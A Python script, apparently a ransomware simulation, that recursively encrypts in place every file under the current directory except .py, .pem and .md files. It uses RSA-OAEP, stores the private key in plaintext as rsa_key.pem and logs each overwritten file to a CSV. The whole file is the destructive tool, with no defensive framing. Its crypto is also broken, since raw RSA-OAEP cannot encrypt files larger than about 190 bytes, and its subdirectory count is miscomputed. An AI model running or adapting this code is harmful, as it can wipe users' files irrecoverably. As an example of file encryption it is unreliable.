#!/usr/bin/env python3
import os
import csv
import platform
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# fie encryption process function
def encrypt_file_rsa(file_path, public_key, log_writer):
    with open(file_path, 'rb') as file:
        plaintext = file.read()
        cipher_text = public_key.encrypt(
            plaintext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    with open(file_path, 'wb') as file:
        file.write(cipher_text)

    file_size = os.path.getsize(file_path)
    log_writer.writerow([file_path, file_size])

# function to generate RSA key
def generate_rsa_key():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

# function to encrypt the directories
def encrypt_files_in_directory(directory_path, excluded_extensions, log_file):
    private_key, public_key = generate_rsa_key()

    with open('rsa_key.pem', 'wb') as key_file:
        key_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))
    # Program to write a csv log file of every encrypted file path and size
    with open(log_file, 'w', newline='') as log:
        log_writer = csv.writer(log)
        log_writer.writerow(['File Path', 'File Size'])

        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_extension = os.path.splitext(file)[1].lower()

                if file_extension in excluded_extensions:
                    continue

                file_path = os.path.join(root, file)
                encrypt_file_rsa(file_path, public_key, log_writer)
                print(f"Encrypted file: {file_path}")

        dir_count = sum(len(dirs) for _, dirs, _ in os.walk(directory_path))
        sub_dir_count = sum(len(subdirs) for _, _, subdirs in os.walk(directory_path))
        disk_size = sum(os.path.getsize(os.path.join(root, file)) for root, _, files in os.walk(directory_path) for file in files)

        log_writer.writerow(['Directory Count', dir_count])
        log_writer.writerow(['Subdirectory Count', sub_dir_count])
        log_writer.writerow(['Disk Size', disk_size])

# main function that iterates though files and subdirectories
def main():
    excluded_extensions = ('.py', '.pem', '.md')
    directory_path = os.getcwd()
    log_file = 'encryption_log.csv' # log file with encrypted files

    encrypt_files_in_directory(directory_path, excluded_extensions, log_file)
    print('All files have been encrypted.')

    if platform.system() == 'Windows':
        os.startfile(log_file)  # Opens the log file using the default program of the operating system
    elif platform.system() == 'Darwin':  # macOS
        os.system('open ' + log_file)
    elif platform.system() == 'Linux':
        os.system('xdg-open ' + log_file)
    else:
        print(f"Unsupported operating system: {platform.system()}. Please open the log file manually.")


if __name__ == "__main__":
    main()